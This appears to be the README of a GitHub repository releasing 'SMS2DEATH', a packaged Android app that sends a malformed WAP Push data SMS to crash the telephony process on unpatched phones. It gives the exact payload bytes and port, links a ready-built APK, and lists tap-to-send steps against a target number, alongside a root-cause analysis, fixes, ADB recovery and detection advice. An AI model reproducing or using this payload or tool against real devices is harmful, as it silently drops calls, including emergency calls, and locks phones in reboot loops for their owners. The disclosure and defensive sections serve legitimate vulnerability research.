# SMS2DEATH

**Remote zero-click denial-of-service against Android telephony**

A single malformed WAP Push SMS crashes `com.android.phone`, terminating active calls (including emergency calls) with no user interaction.

[![Platform](https://img.shields.io/badge/platform-Android%2012%E2%80%9317-3DDC84?style=flat-square&logo=android&logoColor=white)](#affected-versions)
[![Severity](https://img.shields.io/badge/severity-remote%20DoS-critical?style=flat-square&color=E11D48)](#impact)
[![Interaction](https://img.shields.io/badge/interaction-zero--click-8957E5?style=flat-square)](#impact)
[![Vector](https://img.shields.io/badge/vector-WAP%20Push%20%C2%B7%20port%202948-3B82F6?style=flat-square)](#vulnerability)
[![Fixed](https://img.shields.io/badge/patched-Oct%202026%20ASB%20(14%E2%80%9317)-22C55E?style=flat-square)](#the-fix)
[![License](https://img.shields.io/badge/license-Apache--2.0-lightgrey?style=flat-square)](#disclaimer--license)

---

> **Warning**  
> This repository contains a functional proof-of-concept that can remotely disrupt telephony on vulnerable Android devices.  
> It is published strictly for security research, education, and authorised defensive testing.  
> **Only use against devices you own or have explicit permission to test.** Interfering with emergency calling is a serious criminal offence in most jurisdictions.  
> Read [DISCLAIMER.md](DISCLAIMER.md) before use.

---

## Summary

| Field | Detail |
|-------|--------|
| **Component** | `WapPushOverSms` (`frameworks/opt/telephony`) |
| **Vector** | Data SMS · WAP Push · destination port `2948` |
| **Interaction** | None (zero-click, silent) |
| **Affected** | Android 12–17 (patched in 14–17 via October 2026 ASB) |
| **Reporter** | Mark B |
| **Reported** | 5 May 2026 (Android & Devices VRP) |
| **Disclosed** | 29 October 2026 |
| **Recovery** | ADB only (non-technical users effectively bricked) |

**Artifacts**

- APK: [`apk/SMS2DEATH-v2.0-debug.apk`](apk/SMS2DEATH-v2.0-debug.apk)
- Source: [`app/src/main/java/com/hacck3y/sms2death/MainActivity.java`](app/src/main/java/com/hacck3y/sms2death/MainActivity.java)
- Full write-up: <https://smsofdeath.com/>
- Upstream: <https://github.com/MarkBlah/smsofdeath>

---

## Vulnerability

`WapPushOverSms.decodeWapPdu()` reads the WSP header length as a `uintvar` (`long`), casts it to `int` without bounds checking, and uses the result as an array size:

```java
// frameworks/opt/telephony/.../WapPushOverSms.java
int headerLength = (int) pduDecoder.getValue32();
byte[] header = new byte[headerLength];
```

A 5-byte uintvar `88 80 80 80 00` decodes to `0x80000000`. Cast to a signed 32-bit `int`, this becomes `-2147483648`. The subsequent allocation throws an uncaught `NegativeArraySizeException` on the telephony main thread, killing `com.android.phone`.

```
E AndroidRuntime: FATAL EXCEPTION: main
E AndroidRuntime: Process: com.android.phone
E AndroidRuntime: java.lang.NegativeArraySizeException: -2147483648
E AndroidRuntime: at ...WapPushOverSms.decodeWapPdu(WapPushOverSms.java:244)
```

The message is delivered as a data SMS and never appears in the inbox. The sender’s number is not shown to the user.

The vulnerable code has been present since at least Android 12. Google’s October 2026 fix covers Android 14–17. Android 12 and 13 remain unpatched.

---

## Impact

| Effect | Description |
|--------|-------------|
| Zero-click | No user interaction required |
| Silent | Nothing appears in Messages; sender identity hidden |
| Call termination | Active voice calls (including emergency) drop with `DisconnectCause CS_DEATH` |
| Telephony blackout | 1–2 seconds of no service per crash while the process restarts |
| Carrier amplification | Unacknowledged messages are redelivered by the carrier, re-triggering the crash |
| Persistent DoS | Poison message remains in the raw queue and is retried on every boot |
| Extended outage | ~20 messages can render a device unusable for a prolonged period |

Reproduced at 100% across multiple devices (Pixel 9, various Samsung Galaxy/A-series).

---

## Why This Matters

A remote attacker who knows only the victim’s phone number can terminate calls, including calls to emergency services, and force the device into a reboot loop. While the device is affected it cannot reliably reach emergency numbers.

In Australia, under the *Telecommunications (Emergency Call Service) Determination*, carriers must identify handsets that cannot reach Triple Zero (000), assist the customer, and ultimately withdraw service from the device if the condition persists. The regulatory response to a phone that cannot call emergency services is to bar it from the network.

This vulnerability manufactures that condition on demand. The same functional state (ordinary calls possible, emergency calls unreliable) was observed after the 2024 3G shutdown and led to tighter rules.

**Sources**

- [ACMA – New telco rules to support continued access to Triple Zero](https://www.acma.gov.au/articles/2024-10/new-telco-rules-support-continued-access-triple-zero)
- [Telstra – Emergency Call Service Determination](https://www.telstra.com.au/support/mobiles-devices/3g-determination)

---

## The Fix

### Proposed (reporter)

```java
long rawHeaderLen = pduDecoder.getValue32();
if (rawHeaderLen < 0 || rawHeaderLen > pdu.length) {
    result.statusCode = Intents.RESULT_SMS_GENERIC_ERROR;
    return result;
}
int headerLength = (int) rawHeaderLen;
```

### Shipped (October 2026 ASB, Android 14–17)

Google did not add a bounds check. Instead, the catch block was widened and the poison message is deleted on failure:

```java
// WapPushOverSms.java
- } catch (ArrayIndexOutOfBoundsException aie) {
+ } catch (RuntimeException e) {

// InboundSmsHandler.java
+ try { success = processMessagePart(tracker); }
+ catch (RuntimeException e) { deleteFromRawTable(...); }
```

Devices on the October 2026 patch level or later are protected. Earlier patch levels remain vulnerable.

---

## Proof of Concept

**Payload:** `01 06 88 80 80 80 00 BE` (data SMS, port 2948)  
**Requirements:** Android 12+ (API 30+), `SEND_SMS`, `READ_PHONE_STATE`, `READ_PHONE_NUMBERS`

The app sends the malformed PDU, auto-fills the destination from the other SIM when possible, and includes a live radio monitor for on-device observation.

### Usage

1. Install the APK on a device you control and grant the required permissions.
2. Enter the target number (or use auto-fill) and select the sending SIM.
3. Tap **SEND CRASH SMS** and confirm.
4. Observe the target (radio monitor or logcat):

```bash
adb logcat | grep -E 'NegativeArraySize|WapPushOverSms|com.android.phone'
```

Expected result: `FATAL EXCEPTION` in `com.android.phone` within 1–2 seconds, followed by a process restart and brief signal loss.

---

## Recovery (ADB)

Poison messages remain in `content://sms/raw` and are retried on every boot, triggering `RescueParty` (~90-second reboot loop). The following procedure (contributed by [@sakisdog](https://github.com/sakisdog)) clears only the offending rows without a factory reset:

```bash
# Identify WAP Push rows (destination_port=134020)
adb shell content query --uri content://sms/raw --projection _id:destination_port:date:deleted

# Delete by sender address
adb shell cmd appops set com.android.shell WRITE_SMS allow
adb shell "content delete --uri content://sms/raw --where \"address='<SENDER>'\""
adb shell cmd appops set com.android.shell WRITE_SMS default

# Last resort (erases all SMS/MMS and APN settings)
adb shell pm clear com.android.providers.telephony
```

Do **not** choose “Wipe data” at the recovery prompt. This recovery still requires a computer and ADB; a non-technical user is effectively locked out.

---

## Build from Source

```bash
git clone https://github.com/Hacck3y/SMS2DEATH.git
cd SMS2DEATH
echo "sdk.dir=/path/to/Android/Sdk" > local.properties
./gradlew assembleDebug
```

Output: `app/build/outputs/apk/debug/app-debug.apk`

| Property | Value |
|----------|-------|
| minSdk | 30 (Android 12) |
| targetSdk / compileSdk | 35 |
| Application ID | `com.hacck3y.sms2death` |
| Version | 2.0 (`versionCode` 2) |
| Language | Java 17, no third-party dependencies |
| Permissions | `SEND_SMS`, `READ_PHONE_STATE`, `READ_PHONE_NUMBERS` |

---

## Defences and Detection

**Users / administrators**
- Update to the October 2026 (or later) Android security patch level. This is the only complete fix.
- Android 12–13 devices outside the update window remain vulnerable. Check `Settings → About phone → Android security update`.
- Prefer ADB recovery over factory reset if a device enters a reboot loop.

**Carriers / network operators**
- Filter or drop WAP Push data SMS to port 2948 where the service is not required.
- Do not indefinitely redeliver messages that repeatedly fail on the handset; quarantine them.

**Detection**
- Alert on `java.lang.NegativeArraySizeException` originating in `WapPushOverSms.decodeWapPdu` inside `com.android.phone`. This signature should never appear in normal operation.

---

## Affected Versions

| Android version | Status |
|-----------------|--------|
| 17 | Patched (October 2026) |
| 16 | Patched (October 2026) |
| 15 | Patched (October 2026) |
| 14 | Patched (October 2026) |
| 13 | **Vulnerable** (outside security-update window) |
| 12 | **Vulnerable** (outside security-update window) |

October 2026 patch level or later = protected. Anything earlier = vulnerable.

---

## References

- Full write-up: <https://smsofdeath.com/>
- Upstream research: <https://github.com/MarkBlah/smsofdeath>
- AOSP: `frameworks/opt/telephony` (`WapPushOverSms`)
- ACMA emergency-call rules (post-3G shutdown)

---

## Credits

- **Mark B** — discovery, analysis, and original PoC ([MarkBlah/smsofdeath](https://github.com/MarkBlah/smsofdeath))
- **[@sakisdog](https://github.com/sakisdog)** — ADB recovery procedure
- **Hacck3y** — packaged release, UI, radio monitor, and documentation

---

## Disclaimer & License

The software is provided **“as is”**, without warranty, under the [Apache License 2.0](LICENSE).  
The author accepts no liability for any use or misuse.  
By downloading the APK or source you accept full responsibility for your actions.

Read [DISCLAIMER.md](DISCLAIMER.md) before use.

---

<p align="center"><sub>
<b>SMS2DEATH</b> · authorised security research only · do not target devices you do not own or have permission to test
</sub></p>
